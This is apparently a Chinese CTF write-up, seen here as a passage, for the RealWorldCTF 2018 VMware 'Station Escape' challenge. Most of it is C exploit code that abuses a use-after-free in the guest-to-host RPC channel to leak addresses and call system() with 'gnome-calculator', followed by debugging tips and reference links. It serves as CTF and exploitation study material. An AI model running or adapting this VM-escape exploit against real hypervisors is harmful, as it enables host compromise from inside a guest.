+    <span class="n">getchar</span><span class="p">();</span>
+    <span class="n">channel_recv_finish2</span><span class="p">(</span><span class="n">chan</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">cookie1</span><span class="p">,</span><span class="n">chan</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">cookie2</span><span class="p">,</span><span class="n">chan</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">num</span><span class="p">,</span><span class="o">&amp;</span><span class="n">res</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">res</span><span class="p">){</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;fail to recv finish1</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="c1">//finished sending the command, should get the freed buffer</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Finishing sending the buffer , should allocate the buffer..,bp:0x5555556DD5BC</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+    <span class="n">getchar</span><span class="p">();</span>
+    <span class="n">channel_send_data</span><span class="p">(</span><span class="n">chan</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">cookie1</span><span class="p">,</span><span class="n">chan</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">cookie2</span><span class="p">,</span><span class="n">chan</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">num</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="o">&amp;</span><span class="n">s2</span><span class="p">[</span><span class="mi">16</span><span class="p">],</span><span class="o">&amp;</span><span class="n">res</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">res</span><span class="p">){</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;fail to send data</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="c1">//third step,free it again</span>
+    <span class="c1">//set status to be 4</span>
+    <span class="n">channel_recv_reply_len</span><span class="p">(</span><span class="n">chan</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">cookie1</span><span class="p">,</span><span class="n">chan</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">cookie2</span><span class="p">,</span><span class="n">chan</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">num</span><span class="p">,</span><span class="o">&amp;</span><span class="n">len</span><span class="p">,</span><span class="o">&amp;</span><span class="n">res</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">res</span><span class="p">){</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;fail to recv data len</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;recv len:%d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">len</span><span class="p">);</span>
+
+    <span class="c1">//free the output buffer</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Free the buffer again...</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+    <span class="n">getchar</span><span class="p">();</span>
+    <span class="n">channel_recv_finish2</span><span class="p">(</span><span class="n">chan</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">cookie1</span><span class="p">,</span><span class="n">chan</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">cookie2</span><span class="p">,</span><span class="n">chan</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">num</span><span class="p">,</span><span class="o">&amp;</span><span class="n">res</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">res</span><span class="p">){</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;fail to recv finish2</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Trying to reuse the buffer as a struct, which we can leak..</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+    <span class="n">getchar</span><span class="p">();</span>
+    <span class="n">run_cmd</span><span class="p">(</span><span class="n">s5</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Should be done.Check the buffer</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+    <span class="n">getchar</span><span class="p">();</span>
+
+    <span class="c1">//Now the output buffer of chan[1] is used as a struct, which contains many addresses</span>
+    <span class="n">channel_recv_reply_len</span><span class="p">(</span><span class="n">chan</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">cookie1</span><span class="p">,</span><span class="n">chan</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">cookie2</span><span class="p">,</span><span class="n">chan</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">num</span><span class="p">,</span><span class="o">&amp;</span><span class="n">len</span><span class="p">,</span><span class="o">&amp;</span><span class="n">res</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">res</span><span class="p">){</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;fail to recv data len</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+
+
+    <span class="n">data</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">len</span><span class="o">+</span><span class="mh">0x10</span><span class="p">);</span>
+    <span class="n">memset</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">len</span><span class="o">+</span><span class="mh">0x10</span><span class="p">);</span>
+    <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">len</span><span class="o">+</span><span class="mh">0x10</span><span class="p">;</span><span class="n">i</span><span class="o">+=</span><span class="mi">4</span><span class="p">){</span>
+        <span class="n">channel_recv_data</span><span class="p">(</span><span class="n">chan</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">cookie1</span><span class="p">,</span><span class="n">chan</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">cookie2</span><span class="p">,</span><span class="n">chan</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">num</span><span class="p">,</span><span class="n">i</span><span class="p">,</span><span class="n">data</span><span class="p">,</span><span class="o">&amp;</span><span class="n">res</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;recv data:</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+    <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">len</span><span class="p">;</span><span class="n">i</span><span class="o">+=</span><span class="mi">8</span><span class="p">){</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;recv data:%lx</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+    <span class="p">}</span>
+    <span class="n">text</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)</span><span class="n">data</span><span class="p">)</span><span class="o">-</span><span class="mh">0xf818d0</span><span class="p">;</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Leak Success</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">exploit</span><span class="p">(){</span>
+    <span class="c1">//the exploit step is almost the same as the leak ones</span>
+    <span class="k">struct</span> <span class="n">channel</span> <span class="n">chan</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>
+    <span class="kt">int</span> <span class="n">res</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">len</span><span class="p">,</span><span class="n">i</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">s1</span> <span class="o">=</span> <span class="s">&quot;info-set guestinfo.b BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">s2</span> <span class="o">=</span> <span class="s">&quot;info-get guestinfo.b&quot;</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">s3</span> <span class="o">=</span> <span class="s">&quot;1 BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">s4</span> <span class="o">=</span> <span class="s">&quot;gnome-calculator</span><span class="se">\x00</span><span class="s">&quot;</span><span class="p">;</span>
+    <span class="kt">uint64_t</span> <span class="n">pay1</span> <span class="o">=</span><span class="n">text</span><span class="o">+</span><span class="mh">0xFE95B8</span><span class="p">;</span> 
+    <span class="kt">uint64_t</span> <span class="n">pay2</span> <span class="o">=</span><span class="n">text</span><span class="o">+</span><span class="mh">0xECFD0</span><span class="p">;</span> <span class="c1">//system</span>
+    <span class="kt">uint64_t</span> <span class="n">pay3</span> <span class="o">=</span><span class="n">text</span><span class="o">+</span><span class="mh">0xFE95C8</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">pay4</span> <span class="o">=</span> <span class="s">&quot;gnome-calculator</span><span class="se">\x00</span><span class="s">&quot;</span><span class="p">;</span>
+    <span class="n">run_cmd</span><span class="p">(</span><span class="n">s1</span><span class="p">);</span>
+    <span class="n">channel_open</span><span class="p">(</span><span class="o">&amp;</span><span class="n">chan</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">cookie1</span><span class="p">,</span><span class="o">&amp;</span><span class="n">chan</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">cookie2</span><span class="p">,</span><span class="o">&amp;</span><span class="n">chan</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">num</span><span class="p">,</span><span class="o">&amp;</span><span class="n">res</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">res</span><span class="p">){</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;fail to open channel!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">channel_set_len</span><span class="p">(</span><span class="n">chan</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">cookie1</span><span class="p">,</span><span class="n">chan</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">cookie2</span><span class="p">,</span><span class="n">chan</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">num</span><span class="p">,</span><span class="n">strlen</span><span class="p">(</span><span class="n">s2</span><span class="p">),</span><span class="o">&amp;</span><span class="n">res</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">res</span><span class="p">){</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;fail to set len</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">channel_send_data</span><span class="p">(</span><span class="n">chan</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">cookie1</span><span class="p">,</span><span class="n">chan</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">cookie2</span><span class="p">,</span><span class="n">chan</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">num</span><span class="p">,</span><span class="n">strlen</span><span class="p">(</span><span class="n">s2</span><span class="p">),</span><span class="n">s2</span><span class="p">,</span><span class="o">&amp;</span><span class="n">res</span><span class="p">);</span>
+    <span class="n">channel_recv_reply_len</span><span class="p">(</span><span class="n">chan</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">cookie1</span><span class="p">,</span><span class="n">chan</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">cookie2</span><span class="p">,</span><span class="n">chan</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">num</span><span class="p">,</span><span class="o">&amp;</span><span class="n">len</span><span class="p">,</span><span class="o">&amp;</span><span class="n">res</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">res</span><span class="p">){</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;fail to recv data len</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;recv len:%d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">len</span><span class="p">);</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">len</span><span class="o">+</span><span class="mh">0x10</span><span class="p">);</span>
+    <span class="n">memset</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">len</span><span class="o">+</span><span class="mh">0x10</span><span class="p">);</span>
+    <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">len</span><span class="o">+</span><span class="mh">0x10</span><span class="p">;</span><span class="n">i</span><span class="o">+=</span><span class="mi">4</span><span class="p">){</span>
+        <span class="n">channel_recv_data</span><span class="p">(</span><span class="n">chan</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">cookie1</span><span class="p">,</span><span class="n">chan</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">cookie2</span><span class="p">,</span><span class="n">chan</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">num</span><span class="p">,</span><span class="n">i</span><span class="p">,</span><span class="n">data</span><span class="p">,</span><span class="o">&amp;</span><span class="n">res</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;recv data:%s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">data</span><span class="p">);</span>
+    <span class="n">channel_open</span><span class="p">(</span><span class="o">&amp;</span><span class="n">chan</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">cookie1</span><span class="p">,</span><span class="o">&amp;</span><span class="n">chan</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">cookie2</span><span class="p">,</span><span class="o">&amp;</span><span class="n">chan</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">num</span><span class="p">,</span><span class="o">&amp;</span><span class="n">res</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">res</span><span class="p">){</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;fail to open channel!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">channel_open</span><span class="p">(</span><span class="o">&amp;</span><span class="n">chan</span><span class="p">[</span><span class="mi">2</span><span class="p">].</span><span class="n">cookie1</span><span class="p">,</span><span class="o">&amp;</span><span class="n">chan</span><span class="p">[</span><span class="mi">2</span><span class="p">].</span><span class="n">cookie2</span><span class="p">,</span><span class="o">&amp;</span><span class="n">chan</span><span class="p">[</span><span class="mi">2</span><span class="p">].</span><span class="n">num</span><span class="p">,</span><span class="o">&amp;</span><span class="n">res</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">res</span><span class="p">){</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;fail to open channel!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">channel_open</span><span class="p">(</span><span class="o">&amp;</span><span class="n">chan</span><span class="p">[</span><span class="mi">3</span><span class="p">].</span><span class="n">cookie1</span><span class="p">,</span><span class="o">&amp;</span><span class="n">chan</span><span class="p">[</span><span class="mi">3</span><span class="p">].</span><span class="n">cookie2</span><span class="p">,</span><span class="o">&amp;</span><span class="n">chan</span><span class="p">[</span><span class="mi">3</span><span class="p">].</span><span class="n">num</span><span class="p">,</span><span class="o">&amp;</span><span class="n">res</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">res</span><span class="p">){</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;fail to open channel!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">channel_recv_finish2</span><span class="p">(</span><span class="n">chan</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">cookie1</span><span class="p">,</span><span class="n">chan</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">cookie2</span><span class="p">,</span><span class="n">chan</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">num</span><span class="p">,</span><span class="o">&amp;</span><span class="n">res</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">res</span><span class="p">){</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;fail to recv finish2</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">channel_set_len</span><span class="p">(</span><span class="n">chan</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">cookie1</span><span class="p">,</span><span class="n">chan</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">cookie2</span><span class="p">,</span><span class="n">chan</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">num</span><span class="p">,</span><span class="n">strlen</span><span class="p">(</span><span class="n">s3</span><span class="p">),</span><span class="o">&amp;</span><span class="n">res</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">res</span><span class="p">){</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;fail to set len</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;leak2 success</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+    <span class="n">channel_recv_reply_len</span><span class="p">(</span><span class="n">chan</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">cookie1</span><span class="p">,</span><span class="n">chan</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">cookie2</span><span class="p">,</span><span class="n">chan</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">num</span><span class="p">,</span><span class="o">&amp;</span><span class="n">len</span><span class="p">,</span><span class="o">&amp;</span><span class="n">res</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">res</span><span class="p">){</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;fail to recv data len</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">channel_recv_finish2</span><span class="p">(</span><span class="n">chan</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">cookie1</span><span class="p">,</span><span class="n">chan</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">cookie2</span><span class="p">,</span><span class="n">chan</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">num</span><span class="p">,</span><span class="o">&amp;</span><span class="n">res</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">res</span><span class="p">){</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;fail to recv finish2</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">channel_send_data</span><span class="p">(</span><span class="n">chan</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">cookie1</span><span class="p">,</span><span class="n">chan</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">cookie2</span><span class="p">,</span><span class="n">chan</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">num</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="o">&amp;</span><span class="n">pay1</span><span class="p">,</span><span class="o">&amp;</span><span class="n">res</span><span class="p">);</span>
+    <span class="n">channel_set_len</span><span class="p">(</span><span class="n">chan</span><span class="p">[</span><span class="mi">2</span><span class="p">].</span><span class="n">cookie1</span><span class="p">,</span><span class="n">chan</span><span class="p">[</span><span class="mi">2</span><span class="p">].</span><span class="n">cookie2</span><span class="p">,</span><span class="n">chan</span><span class="p">[</span><span class="mi">2</span><span class="p">].</span><span class="n">num</span><span class="p">,</span><span class="n">strlen</span><span class="p">(</span><span class="n">s3</span><span class="p">),</span><span class="o">&amp;</span><span class="n">res</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">res</span><span class="p">){</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;fail to set len</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">channel_set_len</span><span class="p">(</span><span class="n">chan</span><span class="p">[</span><span class="mi">3</span><span class="p">].</span><span class="n">cookie1</span><span class="p">,</span><span class="n">chan</span><span class="p">[</span><span class="mi">3</span><span class="p">].</span><span class="n">cookie2</span><span class="p">,</span><span class="n">chan</span><span class="p">[</span><span class="mi">3</span><span class="p">].</span><span class="n">num</span><span class="p">,</span><span class="n">strlen</span><span class="p">(</span><span class="n">s3</span><span class="p">),</span><span class="o">&amp;</span><span class="n">res</span><span class="p">);</span>
+    <span class="n">channel_send_data</span><span class="p">(</span><span class="n">chan</span><span class="p">[</span><span class="mi">3</span><span class="p">].</span><span class="n">cookie1</span><span class="p">,</span><span class="n">chan</span><span class="p">[</span><span class="mi">3</span><span class="p">].</span><span class="n">cookie2</span><span class="p">,</span><span class="n">chan</span><span class="p">[</span><span class="mi">3</span><span class="p">].</span><span class="n">num</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="o">&amp;</span><span class="n">pay2</span><span class="p">,</span><span class="o">&amp;</span><span class="n">res</span><span class="p">);</span>
+    <span class="n">channel_send_data</span><span class="p">(</span><span class="n">chan</span><span class="p">[</span><span class="mi">3</span><span class="p">].</span><span class="n">cookie1</span><span class="p">,</span><span class="n">chan</span><span class="p">[</span><span class="mi">3</span><span class="p">].</span><span class="n">cookie2</span><span class="p">,</span><span class="n">chan</span><span class="p">[</span><span class="mi">3</span><span class="p">].</span><span class="n">num</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="o">&amp;</span><span class="n">pay3</span><span class="p">,</span><span class="o">&amp;</span><span class="n">res</span><span class="p">);</span>
+    <span class="n">channel_send_data</span><span class="p">(</span><span class="n">chan</span><span class="p">[</span><span class="mi">3</span><span class="p">].</span><span class="n">cookie1</span><span class="p">,</span><span class="n">chan</span><span class="p">[</span><span class="mi">3</span><span class="p">].</span><span class="n">cookie2</span><span class="p">,</span><span class="n">chan</span><span class="p">[</span><span class="mi">3</span><span class="p">].</span><span class="n">num</span><span class="p">,</span><span class="n">strlen</span><span class="p">(</span><span class="n">pay4</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="n">pay4</span><span class="p">,</span><span class="o">&amp;</span><span class="n">res</span><span class="p">);</span>
+    <span class="n">run_cmd</span><span class="p">(</span><span class="n">s4</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">res</span><span class="p">){</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;fail to set len</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="kt">void</span> <span class="nf">main</span><span class="p">(){</span>
+    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+    <span class="n">leak</span><span class="p">();</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;text base :%p&quot;</span><span class="p">,</span><span class="n">text</span><span class="p">);</span>
+    <span class="n">exploit</span><span class="p">();</span>
+<span class="p">}</span>   
+</pre></div>
+Enjoy your calculator:)
+<img alt="" src="/assets/images/backup/realworldctf_2018_stationescape/d46yMQQ.png" /></p>
+<h2 id="_4">关于调试<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<p>调试有点小技巧需要说明一下。首先就是正常的把<code>vmware</code>开起来，然后在<code>host</code>用<code>gdb</code>来<code>attach</code>上去。这个时候我们会下断点，然后继续运行，进入虚拟机<code>guest</code>里面跑<code>exploit</code>脚本。但大家想一下，如果你还在<code>guest</code>里面的时候，<code>host</code>的<code>gdb</code>遇到了断点，会怎样？
+因为<code>gdb</code>遇到了断点，那么<code>guest</code>就被停住了。然而你还在<code>guest</code>里面，你就没有办法按<code>ctrl+alt</code>切出来了，就像被人放了一招<code>时间停止</code>一样。这个时候你除了含泪强制关机之外没有什么好办法。所以大家在调试的时候记得现在exp开头加个<code>sleep</code>,然后在<code>sleep</code>的时候赶紧把鼠标切出来到<code>host</code>中。这样就可以正常调试了。(PS:好像<code>mac</code>不会有这个问题，因为<code>mac</code>可以直接用触摸板切出来?)</p>
+<h2 id="_5">相关材料<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h2>
+<p>题目相关材料：</p>
+<blockquote>
+<p>题目操作系统：Ubuntu x64 1804
+目标VMWare Workstation：VMware-Workstation-Full-15.0.2-10952284.x86_64.bundle，<a href="https://drive.google.com/open?id=1SlojAhX0NCpWTPjASfM03v5QBvRtT-sp">https://drive.google.com/open?id=1SlojAhX0NCpWTPjASfM03v5QBvRtT-sp</a>
+patched VMX：<a href="https://drive.google.com/open?id=1MJQSQYufGtl9DQnG1osyMk_1YbgCPL-E">https://drive.google.com/open?id=1MJQSQYufGtl9DQnG1osyMk_1YbgCPL-E</a></p>
+</blockquote>
+<p>一些参考资料：</p>
+<blockquote>
+<p><a href="https://www.zerodayinitiative.com/blog/2017/6/26/use-after-silence-exploiting-a-quietly-patched-uaf-in-vmware">https://www.zerodayinitiative.com/blog/2017/6/26/use-after-silence-exploiting-a-quietly-patched-uaf-in-vmware</a>
+<a href="https://www.52pojie.cn/thread-783225-1-1.html">https://www.52pojie.cn/thread-783225-1-1.html</a>
+<a href="https://sites.google.com/site/chitchatvmback/backdoor">https://sites.google.com/site/chitchatvmback/backdoor</a></p>
+</blockquote>
+                
+                  
+                
+              
+              
+                <h2 id="__comments">Comments</h2>
+<form id="gitalk-form" onsubmit="return false;">
+    <div id="gitalk-container"></div>
+</form>
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script src="https://cdnjs.loli.net/ajax/libs/blueimp-md5/2.10.0/js/md5.min.js"></script>
+<script>
+    const gitalk = new Gitalk({
